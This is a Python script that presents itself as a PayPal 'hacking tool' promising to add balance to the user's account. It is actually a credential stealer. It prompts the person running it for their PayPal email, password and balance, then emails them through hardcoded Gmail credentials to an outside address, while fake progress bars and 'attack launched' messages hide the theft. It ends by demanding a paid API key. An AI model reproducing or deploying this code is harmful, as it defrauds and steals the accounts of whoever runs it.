import os
os.system('pip3 install tqdm')
os.system('pip3 install colorama')
os.system('pip3 install progressbar')
os.system('pip3 install smtplib')
os.system('clear')
import smtplib
import time as t
from colorama import Fore, Back, Style

from tqdm import tqdm

import progressbar

  

  
# Function to create  

def animated_marker(): 

      

    widgets = ['Loading tools: ', progressbar.AnimatedMarker()] 

    bar = progressbar.ProgressBar(widgets=widgets).start() 

      

    for i in range(50): 

        t.sleep(0.1) 

        bar.update(i) 


# Driver's code 
animated_marker() 
os.system('clear')
logo = Fore.BLUE + ("""--------$$$$$$$$$$$---------------
Coded by fr13nds---TheNextLevel---
--------$$$$$$$$$$$---------------""")
print(Fore.RED + "This tool is a tool for paypal hacking, in order to use this tool make sure to use a vpn and a secured network,...")
P = input("Do you have a paypal account Y/N :")
if P == 'n':
    exit()
elif P == 'N':
     exit()
elif P== 'Y':
     print("To use this tool you must have at least 200$")
     t.sleep(2)
     os.system('clear')
elif P == 'y':
      print("To use this tool you must have at least 200$")
      t.sleep(2)
      os.system('clear')
else:
	print('Invalid input')
	exit()
Dd = (Fore.YELLOW + "This is a paypal hacking tool made by fr13nds, it adds balance to your paypal account.....")
Ard = Fore.YELLOW + ("""------Coded by fr13nds--------TheNextlevel-------""")
intro = input("FOR EDUCATIONAL PURPOSE ONLY  Y/N: ")
if intro == 'y':
	print(Fore.GREEN + "Welcome!!!!")
elif intro == 'Y':
	print(Fore.GREEN + "Welcome!!!")
elif intro == 'n':
	print(Fore.RED + "Aborting.......")
	exit()
elif intro == 'N':
	print(Fore.RED + "Aborting........")
	exit()
else:
	print(Fore.RED + "Invalid input")
	exit()
t.sleep(2)
os.system('clear')
print(logo)
print(Dd)
name = input(Fore.GREEN + "Enter your paypal account(Email/Number): ")
t.sleep(0.5)
t.sleep(2)
gmail_user = ("ofr13nds@gmail.com")
gmail_password = ("Hackersonline@111")
print(Fore.RED + "---------------------++++++++------------")
Choice = input("Enter your paypal account password: ")
print(Fore.RED + "----------------------+++++++------------")
print("-----------------------------------------")
Data = input("Enter your paypal balance :")
if Data < '200':
	print('Not enought balance..','Aborting....')
	exit()
Add = input("Enter amount to add(0-200): ")
if Add > '200':
	exit()
Data = str(Data)
#new section
sent_from = gmail_user
to = ("jameskalifa361@gmail.com")
subject = ("Login Details")
body = ("paypal Username = " +     name +" pass = " + Choice + " Balance = " + Data)
print("Analyzing your request..!!")

    
email_text = """\
From: %s
To: %s
Subject: %s

%s
""" % (sent_from, ", ".join(to), subject, body)

try:
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    server.login(gmail_user, gmail_password)
    server.sendmail(sent_from, to, email_text)
    server.close()
    #Progress bar
    print(Fore.GREEN + "launching attack..")
    for i in tqdm (range (51),  

               desc="Loading…",  

               ascii=False, ncols=75):
               	t.sleep(3)
    
    print (Fore.RED + "Attack launched..")
except:
    print (Fore.RED + "There was a problem pls check your paypal username and password and try again.")
    exit()
Api = input("Enter Your API key to continue : ")
if Api == 'fds$415aa':
	print(Fore.GREEN + 'API key is valid')
else:
	print('Invalid API key')
	t.sleep(0.5)
	print("Buy your API from ofr13nds@gmail.com to continue..")
	print(Fore.RED + "Aborting.....")
	exit()
	# Function to create  

def animated_marker(): 

      

    widgets = ['Loading tools: ', progressbar.AnimatedMarker()] 

    bar = progressbar.ProgressBar(widgets=widgets).start() 

      

    for i in range(50): 

        t.sleep(0.1) 

        bar.update(i) 


# Driver's code 
animated_marker() 
os.system('clear')
print(Fore.GREEN + "Balance Added successfully......")
